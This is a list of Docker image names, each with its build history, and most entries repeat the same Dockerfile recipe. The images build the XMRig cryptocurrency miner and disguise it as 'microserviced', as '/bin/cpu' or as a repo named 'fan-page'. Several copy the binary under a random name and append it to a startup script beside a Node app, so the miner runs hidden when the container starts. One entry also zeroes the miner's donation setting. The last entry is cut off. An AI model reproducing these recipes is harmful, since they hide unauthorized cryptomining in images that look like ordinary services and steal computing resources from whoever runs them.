coreruntime/rogstrix; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
g1080/ztkmini; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
jowegeni/netcore; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
jowegeni/prolisok; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
nonepoxa/ryzen; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
wegerit/jam; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
trekhlebob/ant-mass; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
tecexokel/prefab-parser; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
firstgen/extrabench; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
wiedjmin/vaselisk; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
currentvalue/regressor; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
xkrm/spot; b'ADD file:4583e12bf5caec40b861a3409f2a1624c3f3556cc457edb99c9707f00e779e45 /\nCMD ["/bin/sh"]\nADD file:a021e5586f2a41b7dd7a44906e3870af14633a9bfcd71d761d81302f8ba97b7e /bin\nRUN apk --no-cache upgrade &&     apk --no-cache add         git         cmake         libuv-dev         build-base &&     git clone https://github.com/xmrig/xmrig &&     cd xmrig &&     sed -i s/kDonateLevel\\ =\\ 5/kDonateLevel\\ =\\ 0/g ./src/donate.h &&     mkdir build &&     cmake -DCMAKE_BUILD_TYPE=Release . &&     make &&     mv xmrig /bin/cpu &&     rm -rf /xmrig &&     apk del         build-base         cmake         git\nLABEL docker=run -dt --read-only -m 50M -c 512\nENTRYPOINT ["/bin/run.sh"]'
vaselisk/fan-page; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i &&     git clone https://github.com/cryptocheck/fan-page.git &&     cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN 